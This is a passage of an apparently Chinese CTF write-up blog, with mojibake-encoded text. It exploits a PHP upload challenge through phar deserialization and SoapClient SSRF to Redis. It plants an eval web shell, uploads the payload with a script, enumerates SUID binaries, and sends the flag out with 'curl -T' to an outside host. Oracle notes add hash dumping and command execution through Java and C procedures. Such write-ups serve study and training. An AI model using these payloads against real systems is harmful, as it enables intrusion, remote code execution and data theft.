class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test_upload</span></span><br><span class="line">&#123;</span><br><span class="line">    public $check;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function __construct($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check = new check();</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$this-&gt;check-&gt;checkname($this-&gt;filename)) &#123;</span><br><span class="line">            die(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥è°ƒç”¨ä¸€ä¸ªç±»çš„ <code>checkname</code> , è¿™é‡Œç›´æ¥å°±å¯ä»¥è§¦å‘ <code>SoapClient</code>  çš„ <code>__call</code>  æ–¹æ³•æ‰“ redis.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!empty($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_uploaded_file($tmpname)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($tmpname, <span class="string">&quot;/var/www/html/check.jpg&quot;</span>)) &#123;</span><br><span class="line">            echo <span class="string">&quot;upload ok&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="string">&#x27;check.jpg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|\\\x|&lt;\?/i&quot;</span>, file_get_contents(<span class="string">&#x27;check.jpg&#x27;</span>))) &#123;</span><br><span class="line">        unlink(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!getimagesize(<span class="string">&#x27;check.jpg&#x27;</span>)) &#123;</span><br><span class="line">        unlink(<span class="string">&#x27;check.jpg&#x27;</span>);</span><br><span class="line">        die(<span class="string">&#x27;error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šä¿å­˜ä¸Šä¼ çš„æ–‡ä»¶ä¸º <code>check.jpg</code> , ç„¶åæ£€æµ‹é‡Œé¢çš„å†…å®¹ï¼Œä¸èƒ½æœ‰ <code>ph</code>   <code>\x</code>   <code>&lt;?</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($_GET[<span class="string">&#x27;img_file&#x27;</span>])) &#123;</span><br><span class="line">    echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ï¼Œè¿™é‡Œå°±å¯ä»¥é€šè¿‡ phar åè®®è§¦å‘ååºåˆ—åŒ–</p><h2 id="phar-æ–‡ä»¶ç”Ÿæˆ"><span id="phar-æ–‡ä»¶ç”Ÿæˆ"> phar æ–‡ä»¶ç”Ÿæˆ</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$uri =&lt;&lt;&lt;EOT</span><br><span class="line">hello</span><br><span class="line">Auth 574c941c5987232d337276764d3413c4</span><br><span class="line">Config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line">SET x <span class="string">&#x27;&lt;?=eval(\$_POST[1]);?&gt;&#x27;</span></span><br><span class="line">CONFIG SET dbfilename shell.php</span><br><span class="line">SAVE</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line">EOT;</span><br><span class="line"></span><br><span class="line">$a = array(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;uri&#x27;</span> =&gt; $uri);</span><br><span class="line">$b = new SoapClient(null, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test_upload</span>&#123;</span><br><span class="line">    public $check;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function __construct($check, $filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        $this-&gt;check = $check;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = new test_upload($b, <span class="string">&#x27;exp.jpg&#x27;</span>);</span><br><span class="line">$phar = new Phar(<span class="string">&quot;exp.phar&quot;</span>); //åç¼€åå¿…é¡»ä¸ºphar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span> . <span class="string">&#x27;__HALT_COMPILER();&#x27;</span>); // add GIF Header</span><br><span class="line">$phar-&gt;setMetadata($exp); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®—</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&quot;exp.phar&quot;</span>, <span class="string">&quot;exp.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ä¼šå¯¹æ–‡ä»¶å†…å®¹æœ‰è¿‡æ»¤ï¼Œå› æ­¤è¿˜éœ€è¦ä¿®æ”¹ä¸€äº›æ•°æ®ç”¨ä»¥ç»•è¿‡</p><h2 id="ä¿®æ”¹æ•°æ®"><span id="ä¿®æ”¹æ•°æ®"> ä¿®æ”¹æ•°æ®</span></h2><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1702603230448.png" alt="1702603230448"></p><p>å°†ï¼Ÿæ”¹æˆ <code>\3f</code> ,php ä¸­çš„ h æ”¹æˆ <code>\</code> 68</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1702603440818.png" alt="1702603440818"></p><h2 id="ç­¾åä¿®å¤"><span id="ç­¾åä¿®å¤"> ç­¾åä¿®å¤</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./exp.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">s = f[:-<span class="number">28</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">h = f[-<span class="number">8</span>:]</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line">newf = s+sha1(s).digest()+h</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;1llustrious.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newf)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(sha1(s).digest()))</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ä¸Šä¼ "><span id="æ–‡ä»¶ä¸Šä¼ "> æ–‡ä»¶ä¸Šä¼ </span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.143.192.19:12345/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;1llustrious.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;Conneection&quot;</span>:<span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># print(res2.text)</span></span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8085&quot;</span>,<span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://126.0.0.1:8085&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.get(url=url,verify=<span class="literal">False</span>,headers=headers,proxies=proxies).text)</span><br><span class="line"><span class="comment"># res = requests.post(url=url,files=files,proxies=proxies)</span></span><br><span class="line">res2 = requests.get(url=url + <span class="string">&quot;?img_file=phar:///var/www/html/check.jpg/test.txt&quot;</span>,proxies=proxies)</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><span id="ææƒ"> ææƒ</span></h2><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231215102604310.png" alt="image-20231215102604310"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231215102758715.png" alt="image-20231215102758715"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl file:///flag</span><br><span class="line">curl http://ip:port -T /flag</span><br></pre></td></tr></table></figure><h1 id="what-is-oracle"><span id="what-is-oracle"> what is oracle?</span></h1><p>å­¦ä¹ ä¸€æ³¢ Oracle æ•°æ®åº“ï¼Œ</p><p><a href="https://www.oracle.com/partners/campaign/112010-win64soft-094461.html">Oracle Database 11g Release 2 for Microsoft Windows (x64)</a></p><p>æ•´ä¿© zip, ä¸¤ä¸ª g å•Šï¼Œå¿ƒç–¼æˆ‘çš„æµé‡.</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231221082848748.png" alt="image-20231221082848748"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.168.45.216</span><br></pre></td></tr></table></figure><p>rnm å¯†ç å¿˜äº†ï¼Œé‡è£…äº† 114514 éï¼Œæœ€å SYSTEM Admin123.</p><h2 id="desc"><span id="desc"> desc</span></h2><p>åœ¨ Oracle æ•°æ®åº“ä¸­ï¼Œ <code>DESC</code>  æ˜¯  <code>DESCRIBE</code>  çš„ç¼©å†™ï¼Œç”¨äºæŸ¥çœ‹è¡¨æˆ–è§†å›¾çš„ç»“æ„ï¼ˆåˆ—ä¿¡æ¯ï¼‰ã€‚ <code>DESC</code>  å‘½ä»¤é€šå¸¸ç”¨äºåœ¨ SQL*Plus æˆ–å…¶ä»– SQL ç•Œé¢ä¸­æŸ¥çœ‹è¡¨çš„å…ƒæ•°æ®ä¿¡æ¯ã€‚</p><p>å¸¸è§è¡¨: <code> user_tables</code> , <code>dba_tables</code> , <code>all_tables</code> , <code>ALL_TAB_COLUMNS</code> , <code>ALL_USERS</code>  ç­‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SYSTEM</span></span><br><span class="line">Admin123</span><br></pre></td></tr></table></figure><h2 id="ä¿¡æ¯"><span id="ä¿¡æ¯"> ä¿¡æ¯</span></h2><p>ç‰ˆæœ¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$version;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231221142109616.png" alt="image-20231221142109616"></p><p>æ•°æ®åº“åç§°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> global_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231221142159394.png" alt="image-20231221142159394"></p><p>è·å–è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name</span><br><span class="line"><span class="keyword">FROM</span> all_tables</span><br></pre></td></tr></table></figure><p>è·å–ç”¨æˆ·</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username</span><br><span class="line"><span class="keyword">FROM</span> dba_users;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å–å“ˆå¸Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, password, astatus <span class="keyword">FROM</span> sys.user$;</span><br></pre></td></tr></table></figure><h2 id="å¢åˆ æ”¹æŸ¥"><span id="å¢åˆ æ”¹æŸ¥"> å¢åˆ æ”¹æŸ¥</span></h2><p>å’Œ mysql ä¹‹ç±»çš„å·®ä¸å¤š</p><h2 id="å…¶å®ƒç‰¹æ€§"><span id="å…¶å®ƒç‰¹æ€§"> å…¶å®ƒç‰¹æ€§</span></h2><p>ä½¿ç”¨ <code>concat</code>  æˆ– || æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ <code>''</code>  è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ <code>&quot;&quot;</code>  è¡¨ç¤ºå˜é‡</p><h2 id="java-source"><span id="java-source"> java source</span></h2><p>åœ¨ Oracle æ•°æ®åº“ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Java æ¥åˆ›å»ºå’Œæ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ï¼Œè¿™äº›å­˜å‚¨è¿‡ç¨‹çš„å®ç°æ˜¯ä½¿ç”¨ Java ç¼–å†™çš„ã€‚è¿™è¢«ç§°ä¸º â€œJava Stored Proceduresâ€ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE JAVA SOURCE NAMED &quot;SampleJavaSource&quot; <span class="keyword">AS</span></span><br><span class="line">public class SampleJavaClass &#123;</span><br><span class="line">    public <span class="keyword">static</span> void sampleMethod() &#123;</span><br><span class="line">        System.out.println(&quot;Hello from SampleJavaClass!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703142737647.png" alt="1703142737647"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="operator">=</span><span class="string">&#x27;SampleJavaSource&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703142953811.png" alt="1703142953811"></p><p>æœ‰æ—¶ä¸ºäº†é˜²æ­¢é‡å¤å¯¼è‡´çš„ä¸€äº›é—®é¢˜ï¼Œæœ‰ä¼˜åŒ–çš„å†™æ³•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">AND</span> COMPILE JAVA SOURCE NAMED SampleJavaSource <span class="keyword">as</span> </span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> code </span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> JAVA SOURCE &quot;SampleJavaSource&quot;</span><br></pre></td></tr></table></figure><p>procedured</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">PROCEDURE</span> CallSampleMethod <span class="keyword">AS</span></span><br><span class="line">    <span class="keyword">LANGUAGE</span> JAVA</span><br><span class="line">    NAME <span class="string">&#x27;SampleJavaClass.sampleMethod()&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ›å»º function è°ƒç”¨ä¸€ä¸ªè¿‡ç¨‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> CallSampleFunction <span class="keyword">RETURN</span> VARCHAR2 <span class="keyword">AS</span></span><br><span class="line">    <span class="keyword">result</span> VARCHAR2(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="comment">-- Call the Java stored procedure</span></span><br><span class="line">    CallSampleMethod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- Optionally, you can also call the Java method directly</span></span><br><span class="line">    <span class="comment">-- result := SampleJavaClass.sampleMethod();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">RETURN</span> <span class="string">&#x27;Function called successfully.&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span> CallSampleFunction;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CallSampleFunction <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703145157544.png" alt="1703145157544"></p><h2 id="å¤–éƒ¨-lib"><span id="å¤–éƒ¨-lib"> å¤–éƒ¨ lib</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="operator">&lt;</span>stdio.h<span class="operator">&gt;</span></span><br><span class="line">#include <span class="operator">&lt;</span>stdlib.h<span class="operator">&gt;</span></span><br><span class="line">#include <span class="operator">&lt;</span>exp.h<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span><span class="operator">*</span> cmd(<span class="type">char</span><span class="operator">*</span> command)&#123;</span><br><span class="line">    <span class="keyword">system</span>(cmd);</span><br><span class="line">    <span class="keyword">return</span> &quot;1&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#ifndef exp_h_</span><br><span class="line">#<span class="keyword">define</span> exp_h_</span><br><span class="line"></span><br><span class="line">extern <span class="type">char</span><span class="operator">*</span> cmd(<span class="type">char</span><span class="operator">*</span> command)</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ so</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace lib <span class="keyword">as</span> <span class="string">&#x27;/path/to/so&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> cmd(str varchar2) <span class="keyword">return</span> varchar2 <span class="keyword">as</span> <span class="keyword">language</span> c library lib name &quot;cmd&quot;;</span><br></pre></td></tr></table></figure><p>éšåä½¿ç”¨ select è°ƒç”¨.</p><h2 id="dbms_xmlquery"><span id="dbms_xmlquery"> dbms_xmlquery</span></h2><p><a href="https://www.cnblogs.com/micr067/p/12763325.html">Oracle æ•°æ®åº“ææƒ - micr067 - åšå®¢å›­ (cnblogs.com)</a></p><p><strong>ä½¿ç”¨ XMLType åˆ›å»º XML å¯¹è±¡ï¼š</strong></p><p>åœ¨ä½¿ç”¨  <code>DBMS_XMLQUERY</code>  ä¹‹å‰ï¼Œé€šå¸¸éœ€è¦å°† XML æ–‡æ¡£å­˜å‚¨ä¸º  <code>XMLType</code>  å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨  <code>XMLType</code>  æ„é€ å‡½æ•°æˆ–  <code>XMLType.createXML</code>  æ–¹æ³•ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  xml_document XMLType :<span class="operator">=</span> XMLType(<span class="string">&#x27;&lt;root&gt;&lt;element&gt;Value&lt;/element&gt;&lt;/root&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">result</span> XMLType;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">result</span> :<span class="operator">=</span> DBMS_XMLQUERY.PARSE(xml_document, <span class="string">&#x27;/root/element/text()&#x27;</span>);</span><br><span class="line">  DBMS_OUTPUT.PUT_LINE(<span class="string">&#x27;Result: &#x27;</span> <span class="operator">||</span> result.getStringVal());</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œ XPath æŸ¥è¯¢ï¼š</strong></p><p>ä½¿ç”¨  <code>DBMS_XMLQUERY</code>  åŒ…ä¸­çš„  <code>PARSE</code>  å‡½æ•°æ‰§è¡Œ XPath æŸ¥è¯¢ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">  xml_document XMLType :<span class="operator">=</span> XMLType(<span class="string">&#x27;&lt;root&gt;&lt;element&gt;Value&lt;/element&gt;&lt;/root&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">result</span> XMLType;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">result</span> :<span class="operator">=</span> DBMS_XMLQUERY.PARSE(xml_document, <span class="string">&#x27;/root/element/text()&#x27;</span>);</span><br><span class="line">  DBMS_OUTPUT.PUT_LINE(<span class="string">&#x27;Result: &#x27;</span> <span class="operator">||</span> result.getStringVal());</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">   PRAGMA AUTONOMOUS_TRANSACTION;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">   <span class="keyword">EXECUTE</span> IMMEDIATE <span class="string">&#x27;CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;LinxUtil&quot; AS</span></span><br><span class="line"><span class="string">                      import java.io.*;</span></span><br><span class="line"><span class="string">                      public class LinxUtil extends Object &#123;</span></span><br><span class="line"><span class="string">                          public static String runCMD(String args) &#123;</span></span><br><span class="line"><span class="string">                              try &#123;</span></span><br><span class="line"><span class="string">                                  BufferedReader myReader = new BufferedReader(new InputStreamReader(</span></span><br><span class="line"><span class="string">                                      Runtime.getRuntime().exec(args).getInputStream()));</span></span><br><span class="line"><span class="string">                                  String stemp, str = &quot;&quot;;</span></span><br><span class="line"><span class="string">                                  while ((stemp = myReader.readLine()) != null)</span></span><br><span class="line"><span class="string">                                      str += 